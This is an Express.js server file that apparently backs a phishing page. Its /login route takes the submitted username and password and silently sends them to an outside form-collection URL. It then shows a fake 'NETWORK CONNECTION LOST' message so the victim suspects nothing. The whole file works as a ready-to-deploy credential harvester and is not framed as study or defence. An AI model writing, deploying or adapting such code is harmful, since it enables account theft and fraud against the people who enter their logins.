const express = require("express");
const app = express();
const path = require("path");

// Middleware
app.use(express.urlencoded({ extended: true }));

// ✅ Fix for Vercel: Serve static files correctly relative to the project root
app.use(express.static(path.join(__dirname, "../")));

// Serve main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "../index.html"));
});

// Handle form
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  // Send data directly to Forminit cloud database
  try {
    await fetch("https://forminit.com/f/6nm61pu6gth", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: new URLSearchParams({
        username: username,
        password: password
      })
    });
  } catch (err) {
    // Fails silently in background if needed to ensure response loads smoothly
  }

  res.send(`
    <html>
      <head>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            margin: 0;
          }
          .box {
            background: #111;
            border: 1px solid #333;
            padding: 30px;
            max-width: 400px;
            box-shadow: 0 0 10px rgba(255,255,255,0.05);
            border-radius: 8px;
          }
          h1 {
            font-size: 20px;
            margin-bottom: 10px;
            color: #fff;
          }
          p {
            font-size: 14px;
            color: #aaa;
          }
        </style>
      </head>
      <body>
        <div class="box">
          <h1>NETWORK CONNECTION LOST</h1>
          <p>We're sorry, we couldn't process your request. Try again later.</p>
        </div>
      </body>
    </html>
  `);
});

// ✅ Fix for Vercel: Allow local testing but skip app.listen in production
if (process.env.NODE_ENV !== 'production') {
  app.listen(3000, () => {
    console.log("✅ Server running at http://localhost:3000");
  });
}

// ✅ Fix for Vercel: Export the application instance
module.exports = app;